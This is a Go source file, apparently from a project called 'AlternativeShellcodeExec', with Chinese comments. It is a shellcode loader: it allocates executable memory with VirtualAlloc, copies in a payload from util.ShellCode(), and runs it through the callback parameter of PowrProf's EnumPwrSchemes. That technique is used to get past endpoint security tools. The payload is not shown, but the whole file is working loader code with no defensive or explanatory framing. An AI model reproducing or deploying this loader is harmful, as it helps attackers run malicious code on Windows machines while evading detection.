package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"fmt"
	"syscall"
	"unsafe"
)

const (
	MEM_RESERVE            = 0x2000
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

func Run(op []byte) {
	// 为存储 op 分配内存
	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	virtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE) //，0x40 代替 PAGE_EXECUTE_READWRITE

	// 处理 op 数组
	for i := range op {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = op[i]
	}

	// 使用 EnumPwrSchemes 调用 shellcode
	powrprof, _ := syscall.LoadDLL("PowrProf.dll")
	enumPwrSchemes, _ := powrprof.FindProc("EnumPwrSchemes")
	ret, _, err := enumPwrSchemes.Call(addr, 0)
	if ret == 0 {
		fmt.Printf("EnumPwrSchemes failed: %v\n", err)
		return
	}
}

func main() {
	Run(util.ShellCode())
}
